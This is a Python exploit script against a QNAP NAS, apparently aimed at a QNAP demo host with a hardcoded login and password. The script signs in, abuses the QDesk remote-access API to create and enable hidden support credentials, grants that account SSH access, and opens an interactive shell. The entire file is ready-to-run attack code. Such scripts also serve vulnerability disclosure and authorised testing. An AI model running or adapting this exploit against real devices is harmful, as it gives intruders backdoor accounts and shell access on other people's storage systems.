import requests, base64, json, paramiko
from pwnlib.tubes.ssh import ssh
from pwn import log

PROTO = "http"
PORT = 8080
HOST = "qnap-1607080530118-8988.qnapdemo.com"
BASE_URL = PROTO+"://"+HOST+":"+PORT
USER = "exploit"
PASSWORD = "MA7adCdS"

s = requests.Session()

def login(session, user, password):
    log.info("Connection to {} as '{}'".format(BASE_URL, user))
    response = session.post(BASE_URL+"/cgi-bin/authLogin.cgi",{"user": user, "pwd": base64.b64encode(password.encode())})
    SID = response.text.split("<authSid><![CDATA[")[1].split("]")[0]
    log.success("Connected with SID '{}'.".format(SID))
    return SID

def get_support_credentials(s, SID):
    log.info("Trying to create new support credentials...")
    response = s.get(BASE_URL+"/apps/qdesk/api/v1/remote_access/getkeys", headers={"Cookie":"NAS_SID="+SID})
    credentials = json.loads(response.text)
    if "userId" in credentials and "password" in credentials:
        log.success("Success")
        log.success("'{}' user created with the password '{}'".format(credentials['userId'],credentials['password']))
    else:
        log.error("Not exploitable")
        exit(1)
    return credentials

def enable_credentials(s, SID):
    log.info("Enabling the support credentials...")
    if s.post(BASE_URL+"/apps/qdesk/api/v1/remote_access/enable",data="email=email&ticketId=\n", headers={"Cookie":"NAS_SID="+SID,"Content-Type": "application/x-www-form-urlencoded;"}).status_code == 500:
         log.success("Success")
    else:
        log.error("Not exploitable")
        exit(1)

def add_user_to_ssh(s, SID, user_name):
    log.info("Adding SSH access to '{}' user...".format(user_name))
    data = {
        "apply":"1",
        "action":"allowuser",
        "adduser":user_name
        }
    s.post(BASE_URL+"/cgi-bin/net/networkRequest.cgi?sid={}&subfunc=tel_ssh".format(SID), data)

def connect_to_ssh(credentials):
    log.info("Connecting to SSH ...")
    ssh(host=HOST,user=credentials['userId'],password=credentials['password']).interactive()

SID = login(s, USER, PASSWORD)
credentials = get_support_credentials(s, SID)
enable_credentials(s, SID)
SID = login(s, credentials['userId'], credentials['password'])
add_user_to_ssh(s, SID, credentials['userId'])
connect_to_ssh(credentials)
